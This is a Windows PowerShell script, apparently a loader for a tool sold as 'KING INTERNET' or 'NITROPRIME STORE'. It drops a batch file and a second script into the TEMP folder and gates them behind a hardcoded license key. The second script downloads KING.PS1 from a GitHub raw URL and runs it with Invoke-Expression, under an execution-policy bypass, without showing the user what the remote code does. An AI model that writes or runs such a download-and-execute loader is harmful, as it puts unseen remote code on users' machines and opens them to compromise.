$secret = "Aw4zbp6z9wtru57e10"

$PsScript = @"
`$Host.UI.RawUI.WindowTitle='KING INTERNET INTROPRIME'

while (`$true) {
    Clear-Host
    Write-Host "NITROPRIME STORE" -ForegroundColor Green
    Write-Host ""
    Write-Host "[+]: Press F And Enter"
    
    `$k = Read-Host "[+]"

    if (`$k -eq "F") {
        try {
            Write-Host ""
            Write-Host "[+] Downloading..." -ForegroundColor Yellow
            
            `$url = "https://raw.githubusercontent.com/jxizusisisi-coder/Sh1nchxn-King/refs/heads/main/KING.PS1"

            `$script = Invoke-RestMethod -Uri `$url

            Write-Host "[+] Loaded" -ForegroundColor Green

            Start-Sleep -Seconds 5
            
            Invoke-Expression `$script
        }
        catch {
            Write-Host ""
            Write-Host "ERROR:" -ForegroundColor Red
            Write-Host `$_.Exception.Message -ForegroundColor Red
            Pause
        }
    }
}
"@

$PsFile = "$env:TEMP\AdminControl.ps1"

Set-Content $PsFile $PsScript -Encoding UTF8


$BatScript = @"
@echo off
title KING INTERNET SH1NCHXN 2026
color 07
mode con: cols=70 lines=20
cls

echo.
echo.
echo.
echo.
echo.
set /p input=[+] License Key:

if /I "%input%"=="$secret" (
    color 0A
    echo Correct
    timeout /t 2 >nul

    powershell.exe -WindowStyle Normal -ExecutionPolicy Bypass -File "$PsFile"

) else (
    color 0C
    echo Wrong Key!
    timeout /t 2 >nul
)

exit
"@

$BatFile = "$env:TEMP\KingInternet.bat"

Set-Content $BatFile $BatScript -Encoding ASCII

Start-Process cmd.exe -ArgumentList "/k `"$BatFile`""

exit
